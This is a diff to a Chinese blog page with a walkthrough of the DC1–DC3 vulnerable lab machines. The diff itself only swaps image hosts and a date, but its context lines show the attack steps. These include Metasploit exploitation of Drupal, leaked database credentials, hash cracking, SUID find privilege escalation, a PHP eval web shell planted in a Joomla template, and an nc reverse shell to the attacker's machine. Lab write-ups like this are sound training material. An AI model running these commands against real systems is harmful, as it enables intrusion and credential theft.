@@ -291,7 +291,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/southerose/PictureBed/raw/master/img/20210417103737.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://github.com/southerose/PictureBed/raw/master/img/20210417103737.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -444,7 +444,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-20
+                    2022-05-28
                 </div>
                 
 
@@ -505,7 +505,7 @@
 <h1 id="DC1-1"><a href="#DC1-1" class="headerlink" title="DC1"></a>DC1</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre class="line-numbers language-none"><code class="language-none"># nat模式，先扫一下，探测下IP是多少
 nmap -sP 192.168.60.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/image-20210411102620332.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210411102620332.png"></p>
 <pre class="line-numbers language-none"><code class="language-none"># 探测详细信息
 nmap -A -T 5 192.168.60.133 -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
@@ -525,7 +525,7 @@ nmap -A -T 5 192.168.60.133 -v<span aria-hidden="true" class="line-numbers-rows"
 <td>CMS-Drupal 7，利用已知EXP</td>
 </tr>
 </tbody></table>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411103032.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411103032.png"></p>
 <p>flag1</p>
 <p>使用metasploit getshell。</p>
 <pre class="line-numbers language-none"><code class="language-none"># msfconsle
@@ -535,9 +535,9 @@ nmap -A -T 5 192.168.60.133 -v<span aria-hidden="true" class="line-numbers-rows"
 # set lhost 192.168.60.134
 # run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411103759.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411103759.png"></p>
 <p>ls查看下当前目录下的文件，发现flag1</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411103859.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411103859.png"></p>
 <pre class="line-numbers language-none"><code class="language-none"># cat flag1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <blockquote>
@@ -551,12 +551,12 @@ nmap -A -T 5 192.168.60.133 -v<span aria-hidden="true" class="line-numbers-rows"
 <pre class="line-numbers language-none"><code class="language-none"># shell
 # python -c "import pty;pty.spawn('/bin/bash')"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411104334.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411104404.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411104334.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411104404.png"></p>
 <pre class="line-numbers language-none"><code class="language-none"># 查看配置文件
 cat /var/www/sites/default/settings.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411104634.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411104634.png"></p>
 <p>发现数据库账号和密码</p>
 <pre class="line-numbers language-none"><code class="language-none">username: dbuser
 password: R0ck3t<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -570,19 +570,19 @@ password: R0ck3t<span aria-hidden="true" class="line-numbers-rows"><span></span>
 <h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>登陆下mysql</p>
 <pre class="line-numbers language-none"><code class="language-none">mysql -udbuser -pR0ck3t<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411104917.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411104917.png"></p>
 <p>查看数据库</p>
 <pre class="line-numbers language-none"><code class="language-none">show databases;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411105047.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411105047.png"></p>
 <pre class="line-numbers language-none"><code class="language-none"># use drupaldb;
 # show tables;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411105222.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411105222.png"></p>
 <p>有个users表，然后我们看下字段有哪些。</p>
 <pre class="line-numbers language-none"><code class="language-none">desc users;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411105324.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411105324.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">select name,pass from users;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <table>
@@ -605,9 +605,9 @@ password: R0ck3t<span aria-hidden="true" class="line-numbers-rows"><span></span>
 <p>先使用hashcat查看drupal的mode。</p>
 <pre class="line-numbers language-none"><code class="language-none">hashcat --help | grep "Drupal"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411105916.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411105916.png"></p>
 <p>然后我们还需要将上面两端hash写到一个文件source.txt里面。</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411110205.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411110205.png"></p>
 <p>还需要一个密码字典。</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Auth/password/Top100_pass1.txt">https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Auth/password/Top100_pass1.txt</a></p>
 <p>然后就可以开跑了</p>
@@ -636,14 +636,14 @@ pass01.txt 你的密码表<span aria-hidden="true" class="line-numbers-rows"><sp
 </tr>
 </tbody></table>
 <p>之后直接用浏览器访问该地址，然后用admin账户登录上去就可以看到flag3了</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411111244.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411111244.png"></p>
 <blockquote>
 <p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
 </blockquote>
 <h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>接着根据提示查看passwd</p>
 <pre class="line-numbers language-none"><code class="language-none">cat /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411111429.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411111429.png"></p>
 <p>我们去家目录/home/flag4，发现有个flag4.txt</p>
 <pre class="line-numbers language-none"><code class="language-none">cat /home/flag4/fla4.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -658,7 +658,7 @@ or
 find .-exec /bin/bash -p \;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>提权之后就得找一下了，因为最后一个flag的名字不是flag5，不能使用find去找，我们可以进入root目录下看看，果然发现了thefinalflag.txt</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411112128.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411112128.png"></p>
 <p>final-flag</p>
 <blockquote>
 <p>done!!!!</p>
@@ -671,7 +671,7 @@ find .-exec /bin/bash -p \;<span aria-hidden="true" class="line-numbers-rows"><s
 <p>然后再扫一下具体信息</p>
 <pre class="line-numbers language-none"><code class="language-none">nmap -A -T 5 192.168.60.135 -p 1-65535<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210412211513.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210412211513.png"></p>
 <table>
 <thead>
 <tr>
@@ -713,7 +713,7 @@ wpscan --url http://dc-2/ -e vp --api-token [token]<span aria-hidden="true" clas
 <pre class="line-numbers language-none"><code class="language-none">wpscan --url http://dc-2 --enumerate u
 wpscan --url http://dc-2 --passwords ~/dc2/1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210412220020.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210412220020.png"></p>
 <table>
 <thead>
 <tr>
@@ -761,7 +761,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 </tbody></table>
 <pre class="line-numbers language-none"><code class="language-none">ssh tom@192.168.60.135 -p 7744<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210412220826.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210412220826.png"></p>
 <p>可以看到这是一个rbash（受限制的bash），所以无法使用一些常见的命令，</p>
 <pre class="line-numbers language-none"><code class="language-none">compgen -c 查看可用命令
 less flag3.txt 用less来查看文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -772,7 +772,7 @@ less flag3.txt 用less来查看文件<span aria-hidden="true" class="line-number
 </blockquote>
 <h2 id="flag4-1"><a href="#flag4-1" class="headerlink" title="flag4"></a>flag4</h2><pre class="line-numbers language-none"><code class="language-none">less /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210412221442.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210412221442.png"></p>
 <p>查阅资料得使用 vi 进行逃逸</p>
 <pre class="line-numbers language-none"><code class="language-none">vi
 
@@ -786,7 +786,7 @@ export PATH=$PATH:/bin:/usr/bin<span aria-hidden="true" class="line-numbers-rows
 <pre class="line-numbers language-none"><code class="language-none">su jerry
 输入密码 adipiscing<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210412222015.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210412222015.png"></p>
 <p>进入jerry的家目录，发现</p>
 <p>flag4</p>
 <blockquote>
@@ -809,7 +809,7 @@ export PATH=$PATH:/bin:/usr/bin<span aria-hidden="true" class="line-numbers-rows
 <h1 id="DC3-1"><a href="#DC3-1" class="headerlink" title="DC3"></a>DC3</h1><pre class="line-numbers language-none"><code class="language-none">nmap -sP -T 5 192.168.60.1/24
 nmap -A -T 5 192.168.60.136<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210413195028.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210413195028.png"></p>
 <p>是个名为joomla的内容管理系统，扫下后台</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="http://192.168.60.136/administrator/index.php">http://192.168.60.136/administrator/index.php</a></p>
@@ -820,7 +820,7 @@ nmap -A -T 5 192.168.60.136<span aria-hidden="true" class="line-numbers-rows"><s
 <p>clone下来，然后</p>
 <pre class="line-numbers language-none"><code class="language-none">perl joomscan.pl -u http://192.168.60.136<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210413202724.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210413202724.png"></p>
 <p>发现个joomla的版本为 3.7.0，直接</p>
 <pre class="line-numbers language-none"><code class="language-none">searchsploit joomla 3.7.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -865,7 +865,7 @@ nmap -A -T 5 192.168.60.136<span aria-hidden="true" class="line-numbers-rows"><s
 <p>john爆破</p>
 <pre class="line-numbers language-none"><code class="language-none">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=bcrypt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210413212251.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210413212251.png"></p>
 <table>
 <thead>
 <tr>
@@ -882,8 +882,8 @@ nmap -A -T 5 192.168.60.136<span aria-hidden="true" class="line-numbers-rows"><s
 <p>然后找个模板去index.php进去看下，添加一行</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210414211604.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210414211642.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210414211604.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210414211642.png"></p>
 <p>使用蚁剑连接</p>
 <p>不能直接反弹shell</p>
 <pre class="line-numbers language-none"><code class="language-none">kali:
@@ -895,7 +895,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.60.134 4444
 <pre class="line-numbers language-none"><code class="language-none">lsb_release -a
 uname -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210414212643.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210414212643.png"></p>
 <p>直接搜索searchsploit</p>
 <pre class="line-numbers language-none"><code class="language-none">searchsploit ubuntu 16.04 4.4.x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -1166,7 +1166,7 @@ cat the-flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span>
                 <a href="/2021/04/21/redis-de-jian-dan-li-yong/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220220100058.png" class="responsive-img" alt="redis的简单利用">
+                        <img src="https://github.com/southerose/PictureBed/raw/master/img/20220220100058.png" class="responsive-img" alt="redis的简单利用">
                         
                         <span class="card-title">redis的简单利用</span>
                     </div>
@@ -1214,7 +1214,7 @@ cat the-flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span>
                 <a href="/2021/04/11/git/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411182120.png" class="responsive-img" alt="git+bash教程">
+                        <img src="https://github.com/southerose/PictureBed/raw/master/img/20210411182120.png" class="responsive-img" alt="git+bash教程">
                         
                         <span class="card-title">git+bash教程</span>
                     </div>
